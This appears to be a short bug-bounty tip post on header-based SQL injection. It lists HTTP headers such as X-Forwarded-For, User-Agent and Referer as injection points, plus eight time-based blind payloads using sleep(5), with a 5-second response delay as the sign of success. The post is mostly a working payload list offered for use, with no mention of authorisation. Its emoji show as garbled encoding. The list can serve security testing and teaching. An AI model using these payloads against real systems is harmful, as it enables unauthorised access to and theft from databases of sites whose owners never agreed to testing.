Can't find SQL injections?

You should try header based SQLi's ðŸ‘‡

ðŸ”´ What's that?
Vuln. that allows hackers to exploit SQL injections through HTTP headers being sent between the browser and server.

ðŸŸ¡ But where to find it?
Inject payloads inside of basic HTTP headers

ðŸŸ¢ What payloads do I use?
Use my favorite payloads:

If the injection works, the response will have a delay of 5 seconds!
 
INSIDE OF THESE HTTP HEADERS INJECT BELOW PAYLOADS:
X-Forwarded-For
User-agent
Referer
Accept
Accept-Charset
Content-Type
Connection
Content-Length
X-Client-Ip
X-Remote-Ip
X-Host
X-Forwarded-Host
 
USE THESE PAYLOADS:
sleep(5)#
1 or sleep(5)#
" or sleep(5)#
' or sleep(5)#
" or sleep(5)="
' or sleep(5)='
1) or sleep(5)#
") or sleep(5)="
